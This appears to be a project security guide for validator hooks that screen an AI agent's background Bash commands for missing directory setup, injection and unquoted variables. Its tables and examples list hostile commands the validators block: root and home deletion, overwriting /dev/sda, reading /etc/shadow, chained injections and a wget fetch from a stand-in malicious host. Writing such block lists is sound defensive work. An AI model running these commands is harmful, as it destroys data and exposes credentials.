# Shell Command Security Guide

**Version:** 1.0.0 (Phase 1 + 2 Complete)
**Last Updated:** 2026-01-31
**Related:** ADR-077 Shell Command Security Architecture

## Executive Summary

This guide documents the multi-layer shell security validation system (Phases 1-3) that prevents shell injection, path traversal, and data exfiltration vulnerabilities in background Bash tasks.

**Coverage:**

- Phase 1 (COMPLETE): CWD initialization + shell injection blocking
- Phase 2 (COMPLETE): Variable quoting detection
- Phase 3 (COMPLETE): Shellcheck integration + command allowlist

## Table of Contents

1. [Overview](#overview)
2. [Phase 1: Critical Validators](#phase-1-critical-validators)
3. [Phase 2: Variable Quoting](#phase-2-variable-quoting)
4. [Phase 3: Enhanced Validation](#phase-3-enhanced-validation)
5. [Environment Variables](#environment-variables)
6. [Safe Bash Patterns](#safe-bash-patterns)
7. [Dangerous Patterns (Blocked)](#dangerous-patterns-blocked)
8. [Troubleshooting](#troubleshooting)
9. [Testing](#testing)

---

## Overview

### The Problem

Background Bash tasks execute with undefined CWD, causing:

- **Path Traversal**: `find tests/` searches from root (/) instead of PROJECT_ROOT
- **Data Exposure**: User directories scanned (/c/XboxGames/, Documents/)
- **Shell Injection**: Unvalidated commands allow arbitrary execution
- **Variable Exploitation**: Unquoted variables enable injection attacks

### The Solution

**Three-phase validation pipeline:**

```
┌─────────────────────────────────────────────────────────────┐
│ PHASE 1 (CRITICAL - COMPLETE)                               │
│ ┌──────────────────┐  ┌────────────────────────┐            │
│ │ CWD Validator    │→│ Shell Injection Block  │            │
│ │ (background only)│  │ (all tasks)            │            │
│ └──────────────────┘  └────────────────────────┘            │
│                                                             │
│ PHASE 2 (HIGH - COMPLETE)                                   │
│ ┌──────────────────────────────────────────────┐            │
│ │ Variable Quoting Validator (warn mode)       │            │
│ └──────────────────────────────────────────────┘            │
│                                                             │
│ PHASE 3 (MEDIUM - COMPLETE)                                 │
│ ┌─────────────────┐  ┌─────────────────────────┐            │
│ │ Shellcheck      │→│ Command Allowlist       │            │
│ │ (optional)      │  │ (background only)       │            │
│ └─────────────────┘  └─────────────────────────┘            │
└─────────────────────────────────────────────────────────────┘
```

**Enforcement Modes:**

- `block` (default for Phase 1) - Prevent execution
- `warn` (default for Phase 2) - Log warning, allow execution
- `off` - Disable validation

---

## Phase 1: Critical Validators

### 1.1 CWD Validator (bash-cwd-validator.cjs)

**Purpose:** Ensures background tasks initialize CWD to PROJECT_ROOT before execution.

**Required Pattern:**

```bash
cd "$PROJECT_ROOT" || exit 1
```

**Examples:**

✅ **PASS:**

```bash
cd "$PROJECT_ROOT" && find tests/ -name "*.test.*"
cd "$PROJECT_ROOT" || exit 1; find tests/
cd '$PROJECT_ROOT' && npm test
```

❌ **BLOCK:**

```bash
find tests/  # Missing CWD initialization
cd /tmp && find tests/  # Wrong directory
cd tests/ && find .  # Relative path, not PROJECT_ROOT
```

**Environment:**

```bash
BASH_CWD_VALIDATOR=block  # Block invalid commands (default)
BASH_CWD_VALIDATOR=warn   # Log warning, allow execution
BASH_CWD_VALIDATOR=off    # Disable validation
```

**Error Message:**

```
[BASH-CWD-VALIDATOR] Background Bash task missing CWD initialization.
MUST start with: cd "$PROJECT_ROOT" || exit 1
Fix: Prepend: cd "$PROJECT_ROOT" &&
```

### 1.2 Shell Injection Validator (shell-injection-validator.cjs)

**Purpose:** Blocks dangerous shell patterns that enable command injection or data destruction.

**Blocked Patterns:**

| Pattern     | Example                 | Risk                   |
| ----------- | ----------------------- | ---------------------- |
| `; rm -rf`  | `find tests/; rm -rf /` | Command injection      |
| `\| rm -rf` | `cat file \| rm -rf /`  | Piped injection        |
| `&& rm -rf` | `cd /tmp && rm -rf /`   | Conditional injection  |
| `eval`      | `eval $USER_INPUT`      | Code injection         |
| `> /dev/`   | `echo data > /dev/sda`  | System device override |
| `$(rm`      | `$(rm -rf /)`           | Command substitution   |
| `` `rm` ``  | `` `rm -rf /` ``        | Backtick execution     |

**Dangerous Targets:**

| Pattern    | Example    | Risk                    |
| ---------- | ---------- | ----------------------- |
| `rm -rf /` | `rm -rf /` | Root deletion           |
| `rm -rf ~` | `rm -rf ~` | Home directory deletion |
| `rm -rf *` | `rm -rf *` | Wildcard deletion       |

**Examples:**

✅ **PASS:**

```bash
find tests/ -name "*.test.*"
rm -rf .temp/  # Relative path, not dangerous target
npm test && echo "success"
```

❌ **BLOCK:**

```bash
find tests/; rm -rf /
eval "$UNTRUSTED_INPUT"
cd /tmp && rm -rf *
echo data > /dev/sda
```

**Environment:**

```bash
SHELL_INJECTION_VALIDATOR=block  # Block dangerous commands (default)
SHELL_INJECTION_VALIDATOR=warn   # Log warning, allow execution
SHELL_INJECTION_VALIDATOR=off    # Disable validation (DANGEROUS)
```

**Error Message:**

```
[SHELL-INJECTION] rm -rf / (root deletion)
Detected: /rm\s+-rf\s+\/(?!\w)/
```

---

## Phase 2: Variable Quoting

### 2.1 Variable Quoting Validator (variable-quoting-validator.cjs)

**Purpose:** Detects unquoted variables that can cause word splitting, glob expansion, or injection.

**Required Pattern:**

```bash
"$VAR"  # Quoted variable
'$VAR'  # Single-quoted variable
"${VAR}"  # Quoted braced variable
```

**Dangerous Contexts (HIGH priority warnings):**

| Command | Unquoted Example  | Risk                             |
| ------- | ----------------- | -------------------------------- |
| `cd`    | `cd $DIR`         | Path traversal if DIR malicious  |
| `find`  | `find $DIR`       | Filesystem search wrong path     |
| `rm`    | `rm -rf $FILES`   | Deletion with unintended targets |
| `mv/cp` | `mv $SRC $DEST`   | File operations wrong paths      |
| `chmod` | `chmod 777 $FILE` | Permission changes wrong files   |

**Safe Contexts (lower priority):**

| Command | Unquoted Example | Risk                        |
| ------- | ---------------- | --------------------------- |
| `echo`  | `echo $VAR`      | Output only, limited impact |

**Examples:**

✅ **PASS (no warnings):**

```bash
cd "$PROJECT_ROOT" && find tests/
find "$DIR" -name "*.test.*"
rm -rf "${TEMP_DIR}"
```

⚠️ **WARN (unquoted variable):**

```bash
cd $PROJECT_ROOT && find tests/
# Warning: unquoted variables detected: $PROJECT_ROOT
```

⚠️ **HIGH PRIORITY WARN (dangerous context):**

```bash
cd $USER_INPUT && ls
# Warning (HIGH): unquoted variables detected: $USER_INPUT (dangerous contexts: cd)
```

**Special Variables (allowed unquoted):**

```bash
echo $$  # Process ID
echo $?  # Exit status
echo $!  # Last background process
echo $0-$9  # Positional parameters
```

**Environment:**

```bash
VARIABLE_QUOTING_VALIDATOR=warn   # Warn about unquoted variables (default)
VARIABLE_QUOTING_VALIDATOR=block  # Block unquoted variables
VARIABLE_QUOTING_VALIDATOR=off    # Disable validation
```

**Warning Message:**

```
[VARIABLE-QUOTING-HIGH] unquoted variables detected: $DIR (dangerous contexts: find)
Use "$VAR" instead of $VAR
Fix: Quote variables: "$DIR"
```

---

## Phase 3: Enhanced Validation

### 3.1 Shellcheck Validator (shellcheck-validator.cjs)

**Status:** COMPLETE

**Purpose:** Static analysis of shell commands for syntax errors, portability issues, and common bugs.

**Requirements:**

- shellcheck binary installed (`apt install shellcheck` or `brew install shellcheck`)
- Falls back gracefully if unavailable

**Examples:**

✅ **PASS:**

```bash
if [ -f file.txt ]; then echo "exists"; fi
```

❌ **BLOCK (syntax error):**

```bash
if [ $x -eq 1 ]; echo "missing then"
```

**Environment:**

```bash
SHELLCHECK_VALIDATOR=off   # Disabled (default, requires installation)
SHELLCHECK_VALIDATOR=warn  # Warn on shellcheck errors
SHELLCHECK_VALIDATOR=block # Block on shellcheck errors
```

### 3.2 Command Allowlist Validator (command-allowlist-validator.cjs)

**Status:** COMPLETE

**Purpose:** Restricts background tasks to approved commands (defense-in-depth).

**Allowed Commands (default):**

- `find`, `grep`, `ls`, `cat`, `wc`
- `git`, `node`, `npm`, `pnpm`
- (Customizable via config)

**Examples:**

✅ **PASS (allowed command):**

```bash
find tests/ -name "*.test.*"
```

❌ **BLOCK (disallowed command):**

```bash
wget http://malicious.com/payload.sh
```

**Environment:**

```bash
COMMAND_ALLOWLIST_VALIDATOR=warn   # Warn on disallowed commands (default)
COMMAND_ALLOWLIST_VALIDATOR=block  # Block disallowed commands
COMMAND_ALLOWLIST_VALIDATOR=off    # Disable validation
```

---

## Environment Variables

### Quick Reference

| Variable                      | Default | Purpose                              |
| ----------------------------- | ------- | ------------------------------------ |
| `PROJECT_ROOT`                | (auto)  | Absolute path to project root        |
| `BASH_CWD_VALIDATOR`          | `block` | Phase 1: CWD initialization check    |
| `SHELL_INJECTION_VALIDATOR`   | `block` | Phase 1: Injection pattern blocking  |
| `VARIABLE_QUOTING_VALIDATOR`  | `warn`  | Phase 2: Unquoted variable detection |
| `SHELLCHECK_VALIDATOR`        | `off`   | Phase 3: Shellcheck static analysis  |
| `COMMAND_ALLOWLIST_VALIDATOR` | `warn`  | Phase 3: Command whitelist           |

### Configuration (.env)

```bash
# Shell Command Security (ADR-077)
PROJECT_ROOT=C:\dev\projects\agent-studio
BASH_CWD_VALIDATOR=block
SHELL_INJECTION_VALIDATOR=block
VARIABLE_QUOTING_VALIDATOR=warn
```

### Override Examples

**Development (relaxed):**

```bash
BASH_CWD_VALIDATOR=warn
SHELL_INJECTION_VALIDATOR=warn
VARIABLE_QUOTING_VALIDATOR=warn
```

**Production (strict):**

```bash
BASH_CWD_VALIDATOR=block
SHELL_INJECTION_VALIDATOR=block
VARIABLE_QUOTING_VALIDATOR=block
```

**Testing (disabled):**

```bash
BASH_CWD_VALIDATOR=off
SHELL_INJECTION_VALIDATOR=off
VARIABLE_QUOTING_VALIDATOR=off
```

---

## Safe Bash Patterns

### 1. Background Tasks

**Always use:**

```bash
cd "$PROJECT_ROOT" || exit 1
find tests/ -name "*.test.*"
```

**Alternatives:**

```bash
cd "$PROJECT_ROOT" && find tests/
cd "$PROJECT_ROOT"; find tests/  # Less safe (no error handling)
```

### 2. Variable Quoting

**Always quote:**

```bash
cd "$DIR"
find "$PATH" -name "$PATTERN"
rm -rf "${TEMP_DIR}"
```

**Special cases:**

```bash
# Multiple variables
find "$DIR" -name "$PATTERN" -exec rm {} \;

# Variables in loops
for file in "$DIR"/*.txt; do
  echo "$file"
done
```

### 3. Safe Commands

**File search:**

```bash
cd "$PROJECT_ROOT" && find tests/ -name "*.test.*" -type f
cd "$PROJECT_ROOT" && grep -r "pattern" tests/
cd "$PROJECT_ROOT" && ls -la tests/
```

**Output processing:**

```bash
cd "$PROJECT_ROOT" && find tests/ -name "*.test.*" | wc -l
cd "$PROJECT_ROOT" && grep -r "pattern" . | grep -v "node_modules"
```

**Version control:**

```bash
cd "$PROJECT_ROOT" && git status -s
cd "$PROJECT_ROOT" && git diff tests/
```

---

## Dangerous Patterns (Blocked)

### 1. Filesystem Destruction

❌ **BLOCKED:**

```bash
rm -rf /
rm -rf ~
rm -rf *
rm -rf $UNTRUSTED_VAR  # Unquoted + rm = dangerous
```

### 2. Command Injection

❌ **BLOCKED:**

```bash
find tests/; rm -rf /
echo "data" && rm -rf /
eval $USER_INPUT
```

### 3. System Access

❌ **BLOCKED:**

```bash
echo data > /dev/sda
cat /etc/shadow
chmod 777 /etc/passwd
```

### 4. Unquoted Variables (WARN)

⚠️ **WARNED:**

```bash
cd $DIR  # Use: cd "$DIR"
find $PATH  # Use: find "$PATH"
rm -rf $TEMP  # Use: rm -rf "$TEMP"
```

---

## Troubleshooting

### Error: "Background Bash task missing CWD initialization"

**Cause:** Background task doesn't start with `cd "$PROJECT_ROOT"`.

**Fix:**

```bash
# Before (BLOCKED)
find tests/ -name "*.test.*"

# After (PASS)
cd "$PROJECT_ROOT" && find tests/ -name "*.test.*"
```

### Error: "rm -rf / (root deletion)"

**Cause:** Command contains dangerous deletion pattern.

**Fix:** Validate intent, use relative paths:

```bash
# Before (BLOCKED)
rm -rf /tmp/*

# After (PASS, but verify intent)
cd "$PROJECT_ROOT" && rm -rf .temp/
```

### Warning: "unquoted variables detected: $VAR"

**Cause:** Variable not within quotes.

**Fix:**

```bash
# Before (WARN)
cd $PROJECT_ROOT && find tests/

# After (PASS)
cd "$PROJECT_ROOT" && find tests/
```

### Validator Hook Not Found

**Symptoms:**

```
Error: Hook file not found: .claude/hooks/safety/bash-cwd-validator.cjs
```

**Fixes:**

1. Verify file exists: `ls .claude/hooks/safety/`
2. Check permissions: Should be readable
3. Restore from git: `git checkout HEAD -- .claude/hooks/safety/`

### Environment Variable Not Working

**Debug:**

```bash
# Check if variable is set
echo $BASH_CWD_VALIDATOR

# Check .env file
cat .env | grep BASH_CWD_VALIDATOR

# Reload environment
source .env  # If using bash
```

---

## Testing

### Unit Tests

**CWD Validator:**

```bash
node --test tests/hooks/bash-cwd-validator.test.cjs
# Expected: 17/17 pass
```

**Shell Injection Validator:**

```bash
node --test tests/hooks/shell-injection-validator.test.cjs
# Expected: 25/25 pass
```

**Variable Quoting Validator:**

```bash
node --test tests/hooks/variable-quoting-validator.test.cjs
# Expected: 17/17 pass
```

### Integration Tests

**Phase 1 + 2:**

```bash
node --test tests/integration/shell-security-integration.test.mjs
# Expected: 13/13 pass
```

**Phase 3:**

```bash
node --test tests/integration/shell-security-phase3.test.mjs
# Expected: Depends on shellcheck availability
```

### Manual Testing

**Test CWD enforcement:**

```bash
# Should block
BASH_CWD_VALIDATOR=block node -e "
  const validator = require('./.claude/hooks/safety/bash-cwd-validator.cjs');
  validator.handler({ command: 'find tests/', run_in_background: true }).then(console.log);
"
# Expected: { allowed: false, reason: '...' }

# Should pass
BASH_CWD_VALIDATOR=block node -e "
  const validator = require('./.claude/hooks/safety/bash-cwd-validator.cjs');
  validator.handler({ command: 'cd \"\$PROJECT_ROOT\" && find tests/', run_in_background: true }).then(console.log);
"
# Expected: { allowed: true }
```

**Test injection blocking:**

```bash
node -e "
  const validator = require('./.claude/hooks/safety/shell-injection-validator.cjs');
  validator.handler({ command: 'find tests/; rm -rf /' }).then(console.log);
"
# Expected: { allowed: false, reason: '...' }
```

**Test variable quoting:**

```bash
VARIABLE_QUOTING_VALIDATOR=warn node -e "
  const validator = require('./.claude/hooks/safety/variable-quoting-validator.cjs');
  validator.handler({ command: 'cd \$PROJECT_ROOT && find tests/' }).then(console.log);
"
# Expected: { allowed: true, warning: '...' }
```

---

## Related Documentation

- **ADR-077:** `.claude/context/memory/decisions.md` (Shell Command Security Architecture)
- **Audit Report:** `.claude/context/artifacts/audits/BACKGROUND-TASK-SHELL-AUDIT.md`
- **Issues:**
  - SHELL-SECURITY-001: Background Bash tasks missing CWD initialization
  - SHELL-SECURITY-002: No shell injection validation
  - SHELL-SECURITY-003: Unquoted variables in Bash commands
  - SHELL-SECURITY-004: No shellcheck integration

---

## Changelog

### Phase 2 (2026-01-31) - COMPLETE

- ✅ Created `variable-quoting-validator.cjs` (17 tests passing)
- ✅ Exported `PROJECT_ROOT` to environment (.env.example + .env)
- ✅ Created integration tests (13 tests passing)
- ✅ Updated documentation (this guide)

### Phase 1 (2026-01-31) - COMPLETE

- ✅ Created `bash-cwd-validator.cjs` (17 tests passing)
- ✅ Created `shell-injection-validator.cjs` (25 tests passing)
- ✅ Updated spawn templates (universal-agent-spawn.md, orchestrator-spawn.md)

### Phase 3 (2026-01-31) - COMPLETE

- ✅ Shellcheck integration
- ✅ Command allowlist validator
- ✅ Phase 3 integration tests

---

**Last Updated:** 2026-01-31
**Maintained By:** Security Team
**Version:** 1.0.0
